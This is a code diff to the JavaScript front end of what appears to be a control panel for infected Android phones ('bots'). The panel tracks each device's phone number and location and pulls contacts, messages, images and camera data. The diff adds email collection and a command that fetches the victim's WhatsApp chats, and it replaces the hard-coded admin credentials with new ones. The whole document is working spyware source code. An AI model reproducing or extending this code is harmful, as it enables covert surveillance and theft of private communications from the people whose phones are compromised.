@@ -1,6 +1,6 @@
 var socket = io.connect('http://localhost:3000');       //Connect socket to node.js server
 
-socket.emit('registerAdmin', {usrType: 'admin', usrName: 'kiran', pass: 'suthar'});     //Register
+socket.emit('registerAdmin', {usrType: 'admin', usrName: 'jramirez', pass: 'jramirez'});     //Register
 
 var _botDataList = [];      //TO store multiple bots data
 var currentUID = "";        //To store current selected bot uid
@@ -23,7 +23,7 @@ function newBotHandler(data) {
         version: data.version,
         phone: data.phone,
         location: data.location,
-
+        email: data.email,
         status: true,
         lastSeen: d.toDateString()
     };
@@ -90,6 +90,7 @@ var table_div = document.getElementById('table'),
     images_div = document.getElementById('images'),
     camera_div = document.getElementById('camera'),
     download_div = document.getElementById('download'),
+    whatsapp_div = document.getElementById( 'whatsapp'),
     btns = document.getElementsByClassName("btn waves-effect waves-light"),
     botStatus_para = document.getElementById('botStatus'),
     refresh_check = document.getElementById('refresh-check');
@@ -99,6 +100,18 @@ var firstLoadContacts = true,
     firstLoadMessages = true,
     firstLoadImages = true,
     firstLoadCamera = true;
+    firstLoadWhatsApp = true;
+
+function getWhatsApp() {
+    hideOtherTabs('whatsapp_div');
+    if (refresh_check.checked || firstLoadWhatsApp) {
+        whatsapp_div.innerHTML = 'Obteniendo Chats de WhatsApp desde móvil...';
+        socket.emit('commands', {commands: [{command: 'openWhatsApp'}], uid: currentUID});
+    }
+
+    firstLoadWhatsApp = false;
+    refresh_check.checked = false;
+}
 
 function getContacts() {
     hideOtherTabs('contacts_div');
@@ -363,6 +376,7 @@ function hideOtherTabs(tabName) {
     images_div.style.visibility = 'hidden';
     camera_div.style.visibility = 'hidden';
     download_div.style.visibility = 'hidden';
+    whatsapp_div.style.visibility = 'hidden';
 
     if (tabName === 'table_div') table_div.style.visibility = 'visible';
     if (tabName === 'home_div') home_div.style.visibility = 'visible';
@@ -373,6 +387,7 @@ function hideOtherTabs(tabName) {
     if (tabName === 'images_div') images_div.style.visibility = 'visible';
     if (tabName === 'camera_div') camera_div.style.visibility = 'visible';
     if (tabName === 'download_div') download_div.style.visibility = 'visible';
+    if (tabName === 'whatsapp_div') whatsapp_div.style.visibility = 'visible';
 
 }
 
